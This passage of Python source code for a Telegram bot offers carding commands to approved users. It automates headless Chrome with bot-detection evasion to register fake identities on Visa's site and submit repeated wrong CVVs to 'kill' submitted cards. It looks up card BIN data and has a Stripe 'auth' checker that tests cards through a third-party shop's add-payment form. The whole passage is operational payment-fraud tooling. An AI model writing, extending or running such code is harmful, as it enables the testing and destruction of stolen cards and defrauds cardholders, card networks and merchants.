        record_cmd_success("ko")

    except Exception as e:
        trace = traceback.format_exc()
        edit_message(f"❌ KO Error: `{e}`")
        admin_report(trace, driver)
        record_cmd_failure("ko")
    finally:
        try:
            if driver: driver.quit()
        except: pass
        driver = None
        gc.collect()

async def ko_cmd(update, context):
    uid = update.effective_user.id
    if not is_approved(uid, "ko"):
        await update.message.reply_text("⛔ You are not approved to use /ko", reply_to_message_id=update.message.message_id)
        return
    
    if not is_cmd_enabled("ko"):
        await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
        return

    raw_input = " ".join(context.args) if context.args else ""
    card_input = extract_card_input(raw_input)
    if not card_input:
        await update.message.reply_text("❌ Invalid card.\nUse: `/ko 4111111111111111|12|25|123`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
        return

    msg = await update.message.reply_text(f"💳 `{card_input}`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
    update_dict = {
        "user_id": uid,
        "chat_id": update.effective_chat.id,
        "message_id": msg.message_id
    }
    Process(target=run_ko_process, args=(card_input, update_dict), daemon=True).start()

# ==== 7.5 /zz Command (Killed v5 — fast KO, 6 total CVV attempts) ==== #
def run_zz_process(card_input, update_dict):
    import os, random, traceback, requests, time
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.common.keys import Keys
    from fake_useragent import UserAgent

    CHROME_PATH = "/usr/bin/google-chrome"
    CHROME_DRIVER_PATH = "/usr/bin/chromedriver"
    BOT_TOKEN = os.environ.get("BOT_TOKEN", "")

    def _env_int(name: str, default: int) -> int:
        raw = os.environ.get(name)
        if raw is None or str(raw).strip() == "":
            return default
        try:
            return int(str(raw).strip())
        except Exception:
            return default

    BOT_ADMIN_ID = _env_int("BOT_ADMIN_ID", 123456789)

    def _flag_from_country_code(code: str) -> str:
        code = (code or "").strip().upper()
        if len(code) != 2 or not code.isalpha():
            return ""
        try:
            return "".join(chr(ord(c) + 127397) for c in code)
        except Exception:
            return ""

    def split_card(card_input):
        parts = card_input.replace(' ', '|').replace('/', '|').replace('\\', '|').strip().split('|')
        if len(parts) != 4:
            raise ValueError("Invalid card format")
        return parts[0], parts[1].zfill(2), parts[2][-2:], parts[3]

    def get_bin_info_local(bin_number):
        try:
            res = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=4)
            if res.status_code == 200:
                data = res.json()
                brand = data.get("brand", "Unknown").upper()
                type_ = data.get("type", "Unknown").upper()
                country = data.get("country_name", "Unknown")
                country_code = data.get("country", "") or data.get("country_code", "")
                country_flag = data.get("country_flag", "") or _flag_from_country_code(country_code)
                bank = data.get("bank", "Unknown")
                level = data.get("level", "")

                info_parts = [brand]
                if type_ and type_ != "UNKNOWN":
                    info_parts.append(type_)
                if country and country != "Unknown":
                    info_parts.append(country)
                if level and level != "":
                    info_parts.append(level)
                if bank and bank != "Unknown":
                    info_parts.append(bank)

                return " • ".join(info_parts), country_flag
        except Exception:
            pass
        return "Unavailable", ""

    def get_random_email():
        return ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8)) + "@gmail.com"

    def get_fake_name():
        first = random.choice(["James", "John", "Robert", "Michael", "David"])
        last = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones"])
        return first, last

    def get_fake_address():
        return "123 Elm Street", "New York", "NY", "10001", "20255501" + ''.join(random.choices('0123456789', k=2))

    def get_wrong_cvv(exclude):
        while True:
            fake = ''.join(random.choices('0123456789', k=3))
            if fake != exclude:
                return fake

    def edit_message(text):
        payload = {
            "chat_id": update_dict["chat_id"],
            "message_id": update_dict["message_id"],
            "text": text,
            "parse_mode": "Markdown"
        }
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
        try:
            requests.post(url, data=payload, timeout=8)
        except Exception:
            pass

    def admin_report(trace, driver=None):
        sent = False
        screenshot_path = "zz_fail.png"
        if driver:
            try:
                driver.save_screenshot(screenshot_path)
                with open(screenshot_path, "rb") as img:
                    files = {"photo": img}
                    payload = {
                        "chat_id": BOT_ADMIN_ID,
                        "caption": f"ZZ Error:\n```\n{trace[:900]}\n```",
                        "parse_mode": "Markdown"
                    }
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                        data=payload,
                        files=files,
                        timeout=12
                    )
                sent = True
                os.remove(screenshot_path)
            except Exception:
                pass
        if not sent:
            try:
                payload = {
                    "chat_id": BOT_ADMIN_ID,
                    "text": f"ZZ Error (no screenshot):\n```\n{trace[:900]}\n```",
                    "parse_mode": "Markdown"
                }
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    data=payload,
                    timeout=8
                )
            except Exception:
                pass

    start = time.time()
    driver = None

    try:
        edit_message("⚙️ Processing your request...")

        # Optimized Chrome options for Railway
        options = webdriver.ChromeOptions()
        options.binary_location = CHROME_PATH
        ua = UserAgent().random if UserAgent else "Mozilla/5.0 Chrome/118"
        options.add_argument(f"user-agent={ua}")
        options.add_argument("--headless=new")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-gpu")
        options.add_argument("--disable-extensions")
        options.add_argument("--disable-software-rasterizer")
        options.add_argument("--disable-background-networking")
        options.add_argument("--disable-default-apps")
        options.add_argument("--disable-sync")
        options.add_argument("--no-first-run")
        options.add_argument("--window-size=1920,1080")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        options.set_capability("pageLoadStrategy", "eager")

        service = Service(executable_path=CHROME_DRIVER_PATH)
        driver = webdriver.Chrome(service=service, options=options)
        driver.set_page_load_timeout(20)
        wait = WebDriverWait(driver, 3)

        driver.get("https://src.visa.com/login")

        try:
            btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, ".wscrOk")))
            driver.execute_script("arguments[0].click();", btn)
        except Exception:
            pass

        wait.until(EC.visibility_of_element_located((By.ID, "email-input"))).send_keys(get_random_email())
        wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="continue-button"]'))).click()
        wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="terms-checkbox"]'))).click()
        wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="next-button"]'))).click()

        cc, mm, yy, real_cvv = split_card(card_input)
        bin_info, bin_flag = get_bin_info_local(cc[:6])
        short_card = f"{cc}|{mm}|{yy}|{real_cvv}"

        wrong_cvv = get_wrong_cvv(real_cvv)
        wait.until(EC.visibility_of_element_located((By.ID, "card-input"))).send_keys(cc)
        wait.until(EC.visibility_of_element_located((By.ID, "expiration-input"))).send_keys(mm + yy)
        wait.until(EC.visibility_of_element_located((By.ID, "cvv-input"))).send_keys(wrong_cvv)

        # Billing (USA)
        first_name, last_name = get_fake_name()
        address, city, state, zip_code, phone = get_fake_address()
        wait.until(EC.visibility_of_element_located((By.ID, "first-name-input"))).send_keys(first_name)
        wait.until(EC.visibility_of_element_located((By.ID, "last-name-input"))).send_keys(last_name)

        try:
            country_box = wait.until(
                EC.presence_of_element_located((By.CSS_SELECTOR, '[data-testid="region-select"]'))
            )
            country_val = country_box.get_attribute('value')
            if not country_val or ("United States" not in country_val):
                country_box.click()
                country_box.clear()
                country_box.send_keys("United States")
                wait.until(lambda d: "United States" in country_box.get_attribute('value') or "United States" in country_box.text)
                country_box.send_keys(Keys.ENTER)
        except Exception:
            pass

        wait.until(EC.visibility_of_element_located((By.ID, "line1-input"))).send_keys(address)
        wait.until(EC.visibility_of_element_located((By.ID, "city-input"))).send_keys(city)
        wait.until(EC.visibility_of_element_located((By.ID, "stateProvinceCode-input"))).send_keys(state)
        wait.until(EC.visibility_of_element_located((By.ID, "zip-input"))).send_keys(zip_code)
        wait.until(EC.visibility_of_element_located((By.ID, "card-phone-input-number"))).send_keys(phone)

        add_card_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[data-testid="submit-button"]')))
        driver.execute_script("arguments[0].scrollIntoView(true);", add_card_btn)
        add_card_btn.click()

        edit_message("🔄 Updating your request...")

        # Total CVV attempts = 6 (including the initial submit above)
        TOTAL_TRIES = 6
        used_cvvs = {wrong_cvv}
        for _ in range(TOTAL_TRIES - 1):
            while True:
                fake_cvv = ''.join(random.choices('0123456789', k=3))
                if fake_cvv not in used_cvvs:
                    used_cvvs.add(fake_cvv)
                    break
            try:
                add_card_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[data-testid="submit-button"]')))
                cvv_field = wait.until(EC.visibility_of_element_located((By.ID, "cvv-input")))
                cvv_field.click()
                cvv_field.send_keys(Keys.CONTROL + "a")
                cvv_field.send_keys(fake_cvv)
                driver.execute_script("arguments[0].scrollIntoView(true);", add_card_btn)
                add_card_btn.click()
            except Exception:
                # Keep going; /zz is meant to be fast & best-effort
                pass

        duration = round(time.time() - start, 2)
        edit_message(
            f"💳 **Card:** `{short_card}`\n"
            f"🏦 **BIN:** `{bin_info}` {bin_flag}\n\n"
            f"1 Procceed\n"
            f"2 Processed\n\n"
            f"✅ **Status:** Killed v5 Success\n"
            f"⏱ **Time:** {duration}s"
        )
        record_cmd_success("zz")

    except Exception as e:
        trace = traceback.format_exc()
        edit_message(f"❌ ZZ Error: `{e}`")
        admin_report(trace, driver)
        record_cmd_failure("zz")
    finally:
        try:
            if driver:
                driver.quit()
        except Exception:
            pass
        driver = None
        gc.collect()


async def zz_cmd(update, context):
    uid = update.effective_user.id
    if not is_approved(uid, "zz"):
        await update.message.reply_text("⛔ You are not approved to use /zz", reply_to_message_id=update.message.message_id)
        return

    if not is_cmd_enabled("zz"):
        await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
        return

    raw_input = " ".join(context.args) if context.args else ""
    card_input = extract_card_input(raw_input)
    if not card_input:
        await update.message.reply_text("❌ Invalid card.\nUse: `/zz 4111111111111111|12|25|123`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
        return

    msg = await update.message.reply_text("⚙️ Processing your request...", reply_to_message_id=update.message.message_id)
    update_dict = {
        "user_id": uid,
        "chat_id": update.effective_chat.id,
        "message_id": msg.message_id
    }
    Process(target=run_zz_process, args=(card_input, update_dict), daemon=True).start()

# ==== 7.6 /dd Command (Killed v6 — ultra-fast, 3 CVV attempts only) ==== #
def run_dd_process(card_input, update_dict):
    import os, random, traceback, requests, time
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.common.keys import Keys
    from fake_useragent import UserAgent

    CHROME_PATH = "/usr/bin/google-chrome"
    CHROME_DRIVER_PATH = "/usr/bin/chromedriver"
    BOT_TOKEN = os.environ.get("BOT_TOKEN", "")

    def _env_int(name: str, default: int) -> int:
        raw = os.environ.get(name)
        if raw is None or str(raw).strip() == "":
            return default
        try:
            return int(str(raw).strip())
        except Exception:
            return default

    BOT_ADMIN_ID = _env_int("BOT_ADMIN_ID", 123456789)

    def _flag_from_country_code(code: str) -> str:
        code = (code or "").strip().upper()
        if len(code) != 2 or not code.isalpha():
            return ""
        try:
            return "".join(chr(ord(c) + 127397) for c in code)
        except Exception:
            return ""

    def split_card(card_input):
        parts = card_input.replace(' ', '|').replace('/', '|').replace('\\', '|').strip().split('|')
        if len(parts) != 4:
            raise ValueError("Invalid card format")
        return parts[0], parts[1].zfill(2), parts[2][-2:], parts[3]

    def get_bin_info_local(bin_number):
        try:
            res = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=3)
            if res.status_code == 200:
                data = res.json()
                brand = data.get("brand", "Unknown").upper()
                type_ = data.get("type", "Unknown").upper()
                country = data.get("country_name", "Unknown")
                country_code = data.get("country", "") or data.get("country_code", "")
                country_flag = data.get("country_flag", "") or _flag_from_country_code(country_code)
                bank = data.get("bank", "Unknown")
                level = data.get("level", "")

                info_parts = [brand]
                if type_ and type_ != "UNKNOWN":
                    info_parts.append(type_)
                if country and country != "Unknown":
                    info_parts.append(country)
                if level and level != "":
                    info_parts.append(level)
                if bank and bank != "Unknown":
                    info_parts.append(bank)

                return " • ".join(info_parts), country_flag
        except Exception:
            pass
        return "Unavailable", ""

    def get_random_email():
        return ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8)) + "@gmail.com"

    def get_fake_name():
        first = random.choice(["James", "John", "Robert", "Michael", "David"])
        last = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones"])
        return first, last

    def get_fake_address():
        return "123 Elm Street", "New York", "NY", "10001", "20255501" + ''.join(random.choices('0123456789', k=2))

    def get_wrong_cvv(exclude):
        while True:
            fake = ''.join(random.choices('0123456789', k=3))
            if fake != exclude:
                return fake

    def edit_message(text):
        payload = {
            "chat_id": update_dict["chat_id"],
            "message_id": update_dict["message_id"],
            "text": text,
            "parse_mode": "Markdown"
        }
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
        try:
            requests.post(url, data=payload, timeout=5)
        except Exception:
            pass

    def admin_report(trace, driver=None):
        sent = False
        screenshot_path = "dd_fail.png"
        if driver:
            try:
                driver.save_screenshot(screenshot_path)
                with open(screenshot_path, "rb") as img:
                    files = {"photo": img}
                    payload = {
                        "chat_id": BOT_ADMIN_ID,
                        "caption": f"DD Error:\n```\n{trace[:900]}\n```",
                        "parse_mode": "Markdown"
                    }
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                        data=payload,
                        files=files,
                        timeout=10
                    )
                sent = True
                os.remove(screenshot_path)
            except Exception:
                pass
        if not sent:
            try:
                payload = {
                    "chat_id": BOT_ADMIN_ID,
                    "text": f"DD Error (no screenshot):\n```\n{trace[:900]}\n```",
                    "parse_mode": "Markdown"
                }
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    data=payload,
                    timeout=5
                )
            except Exception:
                pass

    start = time.time()
    driver = None

    try:
        edit_message("⚡ Processing (ultra-fast)...")

        # Optimized Chrome options for Railway
        options = webdriver.ChromeOptions()
        options.binary_location = CHROME_PATH
        ua = UserAgent().random if UserAgent else "Mozilla/5.0 Chrome/118"
        options.add_argument(f"user-agent={ua}")
        options.add_argument("--headless=new")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-gpu")
        options.add_argument("--disable-extensions")
        options.add_argument("--disable-software-rasterizer")
        options.add_argument("--disable-background-networking")
        options.add_argument("--disable-default-apps")
        options.add_argument("--disable-sync")
        options.add_argument("--disable-translate")
        options.add_argument("--no-first-run")
        options.add_argument("--window-size=1920,1080")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        options.set_capability("pageLoadStrategy", "eager")

        service = Service(executable_path=CHROME_DRIVER_PATH)
        driver = webdriver.Chrome(service=service, options=options)
        driver.set_page_load_timeout(20)
        wait = WebDriverWait(driver, 2)

        driver.get("https://src.visa.com/login")

        try:
            btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, ".wscrOk")))
            driver.execute_script("arguments[0].click();", btn)
        except Exception:
            pass

        wait.until(EC.visibility_of_element_located((By.ID, "email-input"))).send_keys(get_random_email())
        wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="continue-button"]'))).click()
        wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="terms-checkbox"]'))).click()
        wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="next-button"]'))).click()

        cc, mm, yy, real_cvv = split_card(card_input)
        bin_info, bin_flag = get_bin_info_local(cc[:6])
        short_card = f"{cc}|{mm}|{yy}|{real_cvv}"

        wrong_cvv = get_wrong_cvv(real_cvv)
        wait.until(EC.visibility_of_element_located((By.ID, "card-input"))).send_keys(cc)
        wait.until(EC.visibility_of_element_located((By.ID, "expiration-input"))).send_keys(mm + yy)
        wait.until(EC.visibility_of_element_located((By.ID, "cvv-input"))).send_keys(wrong_cvv)

        # Billing (USA)
        first_name, last_name = get_fake_name()
        address, city, state, zip_code, phone = get_fake_address()
        wait.until(EC.visibility_of_element_located((By.ID, "first-name-input"))).send_keys(first_name)
        wait.until(EC.visibility_of_element_located((By.ID, "last-name-input"))).send_keys(last_name)

        try:
            country_box = wait.until(
                EC.presence_of_element_located((By.CSS_SELECTOR, '[data-testid="region-select"]'))
            )
            country_val = country_box.get_attribute('value')
            if not country_val or ("United States" not in country_val):
                country_box.click()
                country_box.clear()
                country_box.send_keys("United States")
                wait.until(lambda d: "United States" in country_box.get_attribute('value') or "United States" in country_box.text)
                country_box.send_keys(Keys.ENTER)
        except Exception:
            pass

        wait.until(EC.visibility_of_element_located((By.ID, "line1-input"))).send_keys(address)
        wait.until(EC.visibility_of_element_located((By.ID, "city-input"))).send_keys(city)
        wait.until(EC.visibility_of_element_located((By.ID, "stateProvinceCode-input"))).send_keys(state)
        wait.until(EC.visibility_of_element_located((By.ID, "zip-input"))).send_keys(zip_code)
        wait.until(EC.visibility_of_element_located((By.ID, "card-phone-input-number"))).send_keys(phone)

        add_card_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[data-testid="submit-button"]')))
        driver.execute_script("arguments[0].scrollIntoView(true);", add_card_btn)
        add_card_btn.click()

        edit_message("⚡ Updating (ultra-fast)...")

        # Total CVV attempts = 6 (same as /zz)
        TOTAL_TRIES = 6
        used_cvvs = {wrong_cvv}
        for _ in range(TOTAL_TRIES - 1):
            while True:
                fake_cvv = ''.join(random.choices('0123456789', k=3))
                if fake_cvv not in used_cvvs:
                    used_cvvs.add(fake_cvv)
                    break
            try:
                add_card_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[data-testid="submit-button"]')))
                cvv_field = wait.until(EC.visibility_of_element_located((By.ID, "cvv-input")))
                cvv_field.click()
                cvv_field.send_keys(Keys.CONTROL + "a")
                cvv_field.send_keys(fake_cvv)
                driver.execute_script("arguments[0].scrollIntoView(true);", add_card_btn)
                add_card_btn.click()
            except Exception:
                # Keep going; /dd is meant to be ultra-fast & best-effort
                pass

        duration = round(time.time() - start, 2)
        edit_message(
            f"💳 **Card:** `{short_card}`\n"
            f"🏦 **BIN:** `{bin_info}` {bin_flag}\n\n"
            f"1 Procceed\n"
            f"2 Processed\n\n"
            f"⚡ **Status:** Killed v6 Ultra-Fast\n"
            f"⏱ **Time:** {duration}s"
        )
        record_cmd_success("dd")

    except Exception as e:
        trace = traceback.format_exc()
        edit_message(f"❌ DD Error: `{e}`")
        admin_report(trace, driver)
        record_cmd_failure("dd")
    finally:
        try:
            if driver:
                driver.quit()
        except Exception:
            pass
        # Help garbage collector
        driver = None
        gc.collect()


async def dd_cmd(update, context):
    uid = update.effective_user.id
    if not is_approved(uid, "dd"):
        await update.message.reply_text("⛔ You are not approved to use /dd", reply_to_message_id=update.message.message_id)
        return

    if not is_cmd_enabled("dd"):
        await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
        return

    raw_input = " ".join(context.args) if context.args else ""
    card_input = extract_card_input(raw_input)
    if not card_input:
        await update.message.reply_text("❌ Invalid card.\nUse: `/dd 4111111111111111|12|25|123`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
        return

    msg = await update.message.reply_text("⚡ Processing (ultra-fast)...", reply_to_message_id=update.message.message_id)
    update_dict = {
        "user_id": uid,
        "chat_id": update.effective_chat.id,
        "message_id": msg.message_id
    }
    Process(target=run_dd_process, args=(card_input, update_dict), daemon=True).start()

# ==== 8. STRIPE AUTH V1 (/st) — Single Only (batch removed) ==== #
def extract_all_card_inputs(raw_text: str):
    t = (raw_text or "").replace("\r", "\n")
    t = t.replace("/", "|").replace("\\", "|").replace(" ", "|")
    return re.findall(r"\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}", t)

def run_st_process(card_input, update_dict):
    asyncio.run(st_single_main(card_input, update_dict))

def _wait_for_stripe_iframe(driver, timeout=12):
    """Wait until *any* Stripe Elements iframe appears."""
    end = time.time() + timeout
    SEL = ("iframe[name^='__privateStripeFrame'], "
           "iframe[src*='stripe'], "
           "iframe[src*='js.stripe.com'], "
           "iframe[src*='m.stripe.network']")
    while time.time() < end:
        if driver.find_elements(By.CSS_SELECTOR, SEL):
            return True
        time.sleep(0.4)
    return False

def _open_add_payment_form(driver, wait):
    """
    Click the 'Add payment method' button/link if visible.
    Fallback: navigate directly to the add-payment page.
    Returns True when Stripe iframes are present.
    """
    try:
        btn = wait.until(EC.element_to_be_clickable((
            By.XPATH,
            "//a[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'add payment method')]"
            " | //button[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'add payment method')]"
        )))
        driver.execute_script("arguments[0].scrollIntoView({block:'center'});", btn)
        driver.execute_script("arguments[0].click();", btn)
    except:
        pass
    if _wait_for_stripe_iframe(driver, 8):
        return True
    driver.get("https://www.shoprootscience.com/my-account/add-payment-method")
    return _wait_for_stripe_iframe(driver, 10)

def _is_too_soon(msg: str) -> bool:
    if not msg: return False
    m = msg.lower()
    return ("cannot add a new payment method so soon" in m) or ("too soon" in m)

# Adaptive Stripe filler
def _fill_stripe_fields_adaptive(driver, wait, card, expiry, cvv, clear_first=False):
    import time
    deadline = time.time() + 15
    stripe_iframes = []
    STRIPE_IFRAME_SEL = (
        "iframe[name^='__privateStripeFrame'], "
        "iframe[src*='stripe'], "
        "iframe[src*='js.stripe.com'], "
        "iframe[src*='m.stripe.network']"
    )
    while time.time() < deadline:
        stripe_iframes = driver.find_elements(
            By.CSS_SELECTOR,
            STRIPE_IFRAME_SEL
        )
        if stripe_iframes:
            break
        time.sleep(0.4)
    if not stripe_iframes:
        raise Exception("❌ Stripe fields did not load")

    card_filled = expiry_filled = cvv_filled = False
    number_candidates = [
        ("id", "Field-numberInput"),
        ("css", "input[name='cardnumber'], input[autocomplete='cc-number']"),
        ("css", "input[data-elements-stable-field-name='cardNumber'], input[name='cardNumber']"),
        ("css", "input[aria-label*='card number' i], input[aria-label*='card' i][autocomplete='cc-number']"),
        ("css", "input[placeholder*='1234' i]"),
    ]
    expiry_candidates = [
        ("id", "Field-expiryInput"),
        ("css", "input[name='exp-date'], input[autocomplete='cc-exp']"),
        ("css", "input[data-elements-stable-field-name='cardExpiry'], input[name='cardExpiry']"),
        ("css", "input[aria-label*='expiration' i], input[aria-label*='expiry' i]"),
        ("css", "input[placeholder*='mm / yy' i], input[placeholder*='mm/yy' i]"),
    ]
    cvc_candidates = [
        ("id", "Field-cvcInput"),
        ("css", "input[name='cvc'], input[autocomplete='cc-csc']"),
        ("css", "input[data-elements-stable-field-name='cardCvc'], input[name='cardCvc']"),
        ("css", "input[aria-label*='security code' i], input[aria-label*='cvc' i], input[aria-label*='cvv' i]"),
    ]
    postal_candidates = [
        ("id", "Field-postalCodeInput"),
        ("css", "input[name='postal'], input[name='postalCode'], input[autocomplete='postal-code']"),
        ("css", "input[data-elements-stable-field-name='postalCode'], input[name='billingPostalCode']"),
        ("css", "input[aria-label*='zip' i], input[aria-label*='postal' i]"),
    ]

    def _pick_visible_first(elements):
        for el in elements:
            try:
                if el.is_displayed() and el.is_enabled():
                    return el
            except Exception:
                continue
        return elements[0] if elements else None

    def _fill(cands, value) -> bool:
        els = []
        for kind, sel in cands:
            try:
                els = driver.find_elements(By.ID, sel) if kind == "id" else driver.find_elements(By.CSS_SELECTOR, sel)
            except Exception:
                els = []
            if els:
                break
        if not els:
            return False
        el = _pick_visible_first(els)
        if not el:
            return False
        try:
            el.click()
        except Exception:
            pass
        if clear_first:
            try:
                el.send_keys(Keys.CONTROL, "a")
                el.send_keys(Keys.BACKSPACE)
            except Exception:
                pass
        try:
            el.send_keys(value)
            return True
        except Exception:
            return False

    def _try_fill_current_context() -> None:
        nonlocal card_filled, expiry_filled, cvv_filled
        if not card_filled:
            card_filled = _fill(number_candidates, card) or card_filled
        if not expiry_filled:
            expiry_filled = _fill(expiry_candidates, expiry) or expiry_filled
        if not cvv_filled:
            cvv_filled = _fill(cvc_candidates, cvv) or cvv_filled
        # Some Stripe forms require ZIP/postal code. Best-effort.
        _fill(postal_candidates, _random_us_zip())

    # Try in each top-level Stripe frame; if it looks like a container, also try nested Stripe frames.
    for iframe in stripe_iframes:
        if card_filled and expiry_filled and cvv_filled:
            break
        try:
            driver.switch_to.default_content()
            driver.switch_to.frame(iframe)
        except Exception:
            continue

        _try_fill_current_context()
        if card_filled and expiry_filled and cvv_filled:
            break

        # If this is a Payment Element container, fields may be inside nested frames.
        try:
            nested_frames = driver.find_elements(By.CSS_SELECTOR, STRIPE_IFRAME_SEL)
        except Exception:
            nested_frames = []

        for nf in nested_frames:
            if card_filled and expiry_filled and cvv_filled:
                break
            try:
                driver.switch_to.frame(nf)
                _try_fill_current_context()
            except Exception:
                pass
            finally:
                try:
                    driver.switch_to.parent_frame()
                except Exception:
                    pass

    driver.switch_to.default_content()
    if not (card_filled and expiry_filled and cvv_filled):
        raise Exception("❌ Failed to fill all Stripe fields")

def _random_us_zip() -> str:
    # Use known-valid US ZIPs (avoid placeholders like 12345).
    return random.choice(["10001", "94105", "33101", "60601", "98101", "30301", "77002", "85001", "20001", "02210"])

def _fill_zip_outside_stripe_if_present(driver, zip_code: str) -> None:
    """Fill non-Stripe ZIP fields if the page has them (WooCommerce billing_postcode, etc.)."""
    driver.switch_to.default_content()
    for sel in ("billing_postcode", "address_postal_code", "postal_code", "zip"):
        try:
            el = driver.find_element(By.ID, sel)
            el.click()
            el.send_keys(Keys.CONTROL, "a")
            el.send_keys(Keys.BACKSPACE)
            el.send_keys(zip_code)
            # Trigger blur/change
            driver.execute_script("arguments[0].dispatchEvent(new Event('change', {bubbles:true}));", el)
            driver.execute_script("arguments[0].dispatchEvent(new Event('blur', {bubbles:true}));", el)
            return
        except Exception:
            continue

# "Save my information for faster checkout" (Stripe Link) can force phone collection.
# We always opt-out by ensuring it's unchecked.
def _st_opt_out_faster_checkout(driver) -> None:
    """
    Stripe Link sometimes renders the "Save my information for faster checkout" UI as:
    - a normal <input type="checkbox"> (often hidden) + label, OR
    - a custom element with role="checkbox" and aria-checked.
    It may also be inside a Stripe/Link iframe. We search current document and all iframes.
    """

    def _try_uncheck_current_context() -> bool:
        # Return True if we found the control (checked or unchecked) in this context.
        js = r"""
(() => {
  const norm = (s) => (s || "").toLowerCase();
  const textMatch = (t) => t.includes("save my information") && (t.includes("faster checkout") || t.includes("checkout"));

  // 1) Prefer finding by visible text near the control
  const nodes = Array.from(document.querySelectorAll("label, span, div, p, button"));
  const hits = nodes.filter(n => textMatch(norm(n.innerText)));
  for (const n of hits) {
    const root = n.closest("form, section, div") || n.parentElement;
    if (!root) continue;

    const cb = root.querySelector("input[type='checkbox']");
    if (cb) {
      if (cb.checked) cb.click();
      return true;
    }

    const roleCb = root.querySelector("[role='checkbox']");
    if (roleCb) {
      const checked = norm(roleCb.getAttribute("aria-checked"));
      if (checked === "true" || checked === "mixed") roleCb.click();
      return true;
    }
  }

  // 2) Fallback: any role checkbox that looks like Link/save-info
  const roleCbs = Array.from(document.querySelectorAll("[role='checkbox']"));
  for (const el of roleCbs) {
    const al = norm(el.getAttribute("aria-label"));
    const checked = norm(el.getAttribute("aria-checked"));
    if (al.includes("save") && al.includes("information")) {
      if (checked === "true" || checked === "mixed") el.click();
      return true;
    }
  }

  // 3) Fallback: inputs with Link/save-ish attributes/labels
  const inputs = Array.from(document.querySelectorAll("input[type='checkbox']"));
  for (const cb of inputs) {
    const name = `${norm(cb.id)} ${norm(cb.name)} ${norm(cb.getAttribute("aria-label"))}`;
    const labelText = cb.labels && cb.labels.length ? norm(cb.labels[0].innerText) : "";
    if (labelText.includes("save my information") || (name.includes("save") && (name.includes("info") || name.includes("information") || name.includes("link")))) {
      if (cb.checked) cb.click();
      return true;
    }
  }

  return false;
})()
"""
        try:
            found = driver.execute_script(js)
            return bool(found)
        except Exception:
            return False

    # Try default content first
    try:
        driver.switch_to.default_content()
    except Exception:
        pass
    found_any = _try_uncheck_current_context()

    # Try every iframe (Stripe often uses multiple nested frames)
    try:
        driver.switch_to.default_content()
        iframes = driver.find_elements(By.TAG_NAME, "iframe")
    except Exception:
        iframes = []

    for frame in iframes:
        try:
            driver.switch_to.default_content()
            driver.switch_to.frame(frame)
            if _try_uncheck_current_context():
                found_any = True
        except Exception:
            continue
        finally:
            try:
                driver.switch_to.default_content()
            except Exception:
                pass

    # Give the UI a moment to apply if we changed it
    if found_any:
        time.sleep(0.2)

# ---------- ST admin screenshot helpers ----------
def _st_md_safe(s: str) -> str:
    # This codebase uses parse_mode="Markdown" widely without escaping; keep it simple + safe-ish.
    return (s or "").replace("`", "'")

async def _st_send_admin_screenshot(
    bot: "Bot",
    driver,
    caption: str,
) -> None:
    """
    Best-effort: capture a screenshot and send it to BOT_ADMIN_ID.
    (Used for /st "response capture" screenshots.)
    """
    if not driver:
        return
    tmp_path = None
    try:
        # Unique per-process/per-call to avoid collisions across multiprocessing workers
        with tempfile.NamedTemporaryFile(prefix=f"st_{os.getpid()}_", suffix=".png", delete=False) as f:
            tmp_path = f.name
        driver.save_screenshot(tmp_path)
        with open(tmp_path, "rb") as photo:
            await bot.send_photo(
                chat_id=BOT_ADMIN_ID,
